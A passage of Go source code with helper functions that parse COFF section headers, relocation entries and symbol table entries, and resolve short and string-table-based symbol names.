	sec.VirtualSize = binary.LittleEndian.Uint32(data[8:])
	sec.VirtualAddress = binary.LittleEndian.Uint32(data[12:])
	sec.SizeOfRawData = binary.LittleEndian.Uint32(data[16:])
	sec.PointerToRawData = binary.LittleEndian.Uint32(data[20:])
	sec.PointerToRelocations = binary.LittleEndian.Uint32(data[24:])
	sec.PointerToLineNumbers = binary.LittleEndian.Uint32(data[28:])
	sec.NumberOfRelocations = binary.LittleEndian.Uint16(data[32:])
	sec.NumberOfLineNumbers = binary.LittleEndian.Uint16(data[34:])
	sec.Characteristics = binary.LittleEndian.Uint32(data[36:])
	return sec
}

// parseCOFFRelocation reads a relocation entry from data.
func parseCOFFRelocation(data []byte) coffRelocation {
	return coffRelocation{
		VirtualAddress:   binary.LittleEndian.Uint32(data[0:]),
		SymbolTableIndex: binary.LittleEndian.Uint32(data[4:]),
		Type:             binary.LittleEndian.Uint16(data[8:]),
	}
}

// parseCOFFSymbol reads a symbol table entry from data.
func parseCOFFSymbol(data []byte) coffSymbol {
	var sym coffSymbol
	copy(sym.Name[:], data[:8])
	sym.Value = binary.LittleEndian.Uint32(data[8:])
	sym.SectionNumber = int16(binary.LittleEndian.Uint16(data[12:]))
	sym.Type = binary.LittleEndian.Uint16(data[14:])
	sym.StorageClass = data[16]
	sym.NumberOfAuxSymbols = data[17]
	return sym
}

// sectionName extracts a null-terminated section name.
func sectionName(raw [8]byte) string {
	for i, b := range raw {
		if b == 0 {
			return string(raw[:i])
		}
	}
	return string(raw[:])
}

// symbolName resolves a COFF symbol name. If the first 4 bytes are zero,
// the remaining 4 bytes are an offset into the string table.
func symbolName(raw [8]byte, data []byte, stringTableOff int) string {
	// Short name: first 4 bytes are nonzero.
	if binary.LittleEndian.Uint32(raw[:4]) != 0 {
		for i, b := range raw {
			if b == 0 {
				return string(raw[:i])
			}
		}
		return string(raw[:])
	}

	// Long name: offset into string table.
	offset := binary.LittleEndian.Uint32(raw[4:8])
	start := stringTableOff + int(offset)
	if start >= len(data) {
		return ""
	}

	end := start
	for end < len(data) && data[end] != 0 {
		end++
	}
	return string(data[start:end])
}
